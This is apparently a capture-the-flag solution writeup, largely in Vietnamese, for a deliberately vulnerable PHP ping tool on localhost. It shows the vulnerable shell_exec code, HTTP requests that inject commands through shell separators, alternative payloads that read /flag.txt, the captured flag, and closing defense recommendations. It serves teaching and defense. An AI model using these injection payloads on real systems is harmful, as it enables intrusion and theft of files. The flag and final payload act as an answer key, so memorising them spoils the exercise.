# CMDi-001 Solution Writeup

## Vulnerability Analysis

### Bản Chất Lỗ Hổng

Ứng dụng có lỗ hổng **OS Command Injection** trong chức năng ping network diagnostic.

### Vulnerable Code Pattern

```php
$ip = $_POST['ip'];
$output = shell_exec("ping -c 4 " . $ip);
echo "<pre>$output</pre>";
```

**Vấn đề kỹ thuật:**
- User input (`$ip`) được **concatenate trực tiếp** vào command string
- Không có **input validation** hoặc **sanitization**
- Hàm `shell_exec()` gọi shell thực sự (`/bin/sh`), cho phép shell metacharacters được interpret

### Tại Sao Lỗ Hổng Xảy Ra?

1. **Developer assumption**: Developer giả định user chỉ nhập IP address hợp lệ
2. **Lack of input validation**: Không kiểm tra input có đúng format IP không
3. **Direct shell invocation**: Sử dụng `shell_exec()` thay vì các hàm an toàn hơn

---

## Exploitation Workflow

Tuân theo workflow chuẩn: **RECON → HYPOTHESIS → EXPLOITATION → VALIDATION**

### Phase 1: RECON - Quan Sát Behavior

**Step 1.1: Test Normal Functionality**

**Request:**
```http
POST /ping HTTP/1.1
Host: localhost:5101
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1
```

**Response:**
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.039 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.034 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.035 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3060ms
rtt min/avg/max/mdev = 0.031/0.034/0.039/0.006 ms
```

**Observation:**
- Output hiển thị **trực tiếp** trong response → **In-band injection** có thể
- Ping chạy 4 lần (`-c 4`) → Server là Linux (Windows dùng `-n`)
- Response time ~3 giây → Chứng tỏ lệnh thực sự được execute

**Step 1.2: Identify Injection Context**

Dựa vào knowledge base [01-detection.md], cần xác định input nằm trong context nào:

| Context | Original Command | Detection Approach |
|---------|------------------|---------------------|
| Unquoted | `ping $ip` | Thử trực tiếp `;id` |
| Single-quoted | `ping '$ip'` | Escape với `';id #` |
| Double-quoted | `ping "$ip"` | Escape với `";id #` |

---

### Phase 2: HYPOTHESIS - Hình Thành Giả Thuyết

**Giả thuyết 1**: Input được đưa trực tiếp vào command mà không có quotes

Nếu backend code là:
```php
shell_exec("ping -c 4 " . $ip);
```

Thì với input `127.0.0.1; id`, command thực tế sẽ là:
```bash
ping -c 4 127.0.0.1; id
```

Shell sẽ interpret `;` như command separator và chạy cả hai commands.

---

### Phase 3: EXPLOITATION - Xác Nhận Giả Thuyết

**Step 3.1: Test với Semicolon Separator**

**Request:**
```http
POST /ping HTTP/1.1
Host: localhost:5101
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1; id
```

**URL Encoded:**
```
ip=127.0.0.1%3B%20id
```

**Response:**
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.029 ms
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ **CONFIRMED!** Output của `id` command xuất hiện → Command Injection thành công!

**Phân tích kỹ thuật:**
- `;` đóng vai trò **sequential operator** trong shell
- Shell thực thi: `ping -c 4 127.0.0.1` → DONE → `id` → DONE
- Cả hai outputs được trả về trong response

**Step 3.2: Test với Các Separator Khác**

Để hiểu rõ hơn về attack surface, test thêm các separators:

| Separator | Payload | Result | Explanation |
|-----------|---------|--------|-------------|
| `;` | `127.0.0.1; whoami` | ✅ Works | Sequential execution |
| `\|` | `127.0.0.1 \| whoami` | ✅ Works | Pipe - whoami nhận ping output làm input |
| `\|\|` | `invalid \|\| whoami` | ✅ Works | OR - chạy whoami nếu ping fail |
| `&&` | `127.0.0.1 && whoami` | ✅ Works | AND - chạy whoami nếu ping success |
| `&` | `127.0.0.1 & whoami` | ✅ Works | Background - chạy ping background, whoami foreground |

**Tất cả đều hoạt động** → Đây là **unquoted context**, không có filtering.

---

### Phase 4: VALIDATION - Thu Thập Flag

**Step 4.1: Reconnaissance - Khám Phá Hệ Thống**

**Current user:**
```
ip=127.0.0.1; whoami
```
→ `www-data`

**Current directory:**
```
ip=127.0.0.1; pwd
```
→ `/var/www/html`

**List files in current directory:**
```
ip=127.0.0.1; ls -la
```
→ Hiển thị các file của web application

**Step 4.2: Tìm Flag File**

**Thử các vị trí phổ biến:**

```
ip=127.0.0.1; ls -la /
```
→ Thấy có `/flag.txt`

**Hoặc dùng find:**
```
ip=127.0.0.1; find / -name "*flag*" 2>/dev/null
```
→ `/flag.txt`

**Step 4.3: Đọc Flag**

**Request:**
```http
POST /ping HTTP/1.1
Host: localhost:5101
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1; cat /flag.txt
```

**Response:**
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
...
FLAG{b4s1c_s3m1c0l0n_1nj3ct10n_m4st3r3d}
```

✅ **FLAG CAPTURED!**

---

## Alternative Payloads

Các cách khác để đạt được kết quả tương tự:

### Sử dụng Pipe
```
ip=| cat /flag.txt
```
Command: `ping -c 4 | cat /flag.txt`
Ping fail (no argument), cat vẫn chạy vì pipe.

### Sử dụng Newline
```
ip=127.0.0.1%0acat /flag.txt
```
Command:
```
ping -c 4 127.0.0.1
cat /flag.txt
```
Newline (`%0a`) là command separator trong shell.

### Sử dụng Command Substitution
```
ip=$(cat /flag.txt)
```
Command: `ping -c 4 $(cat /flag.txt)`
Flag content trở thành argument của ping (sẽ fail nhưng có thể visible trong error).

### Sử dụng Backticks
```
ip=`cat /flag.txt`
```
Tương tự `$()` nhưng syntax cũ hơn.

---

## Final Payload

```
127.0.0.1; cat /flag.txt
```

**URL Encoded:**
```
ip=127.0.0.1%3B%20cat%20%2Fflag.txt
```

---

## Flag

```
FLAG{b4s1c_s3m1c0l0n_1nj3ct10n_m4st3r3d}
```

---

## Key Learnings

### 1. Detection Methodology

- **Luôn test behavior bình thường trước** để có baseline comparison
- **Output visibility** quyết định exploitation strategy (in-band vs blind)
- **OS identification** từ response (Linux ping format vs Windows)

### 2. Shell Separator Knowledge

| Separator | Behavior | Use Case |
|-----------|----------|----------|
| `;` | Sequential execution | Chạy command tiếp theo bất kể kết quả |
| `\|` | Pipe output | Chạy command với output của command trước |
| `\|\|` | OR logic | Chạy nếu command trước fail |
| `&&` | AND logic | Chạy nếu command trước success |
| `&` | Background | Chạy command trước trong background |

### 3. Context Analysis

- **Unquoted context** cho phép tất cả separators hoạt động
- Nếu một separator hoạt động, **thử tất cả** để hiểu filtering
- Semicolon (`;`) là separator **phổ biến nhất** cho Linux

### 4. Exploitation Workflow

```
RECON → Quan sát normal behavior
       ↓
HYPOTHESIS → Đoán injection context
       ↓
EXPLOITATION → Test với separators
       ↓
VALIDATION → Confirm và escalate
```

---

## Defense Recommendations

### 1. Avoid OS Commands (Best)
```php
// Thay vì shell_exec("ping ...")
// Sử dụng socket-based approach
$socket = @fsockopen($ip, 80, $errno, $errstr, 5);
```

### 2. Input Validation (Allowlist)
```php
// Chỉ accept IP address format
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die("Invalid IP address");
}
```

### 3. Escape Special Characters
```php
// escapeshellarg() wrap input trong quotes và escape
$ip = escapeshellarg($_POST['ip']);
shell_exec("ping -c 4 " . $ip);
```

### 4. Use Parameterized Execution
```php
// proc_open với arguments array
$process = proc_open(
    ['ping', '-c', '4', $ip],  // Arguments as array, not string
    $descriptors,
    $pipes
);
```

---

## References

- [Command Injection Overview](../../../../_knowledge_base/Web/Command%20Injection/00-overview.md)
- [Detection Techniques](../../../../_knowledge_base/Web/Command%20Injection/01-detection.md)
- [Exploitation Techniques](../../../../_knowledge_base/Web/Command%20Injection/02-exploitation.md)
- [Defense & Mitigation](../../../../_knowledge_base/Web/Command%20Injection/08-defense-mitigation.md)
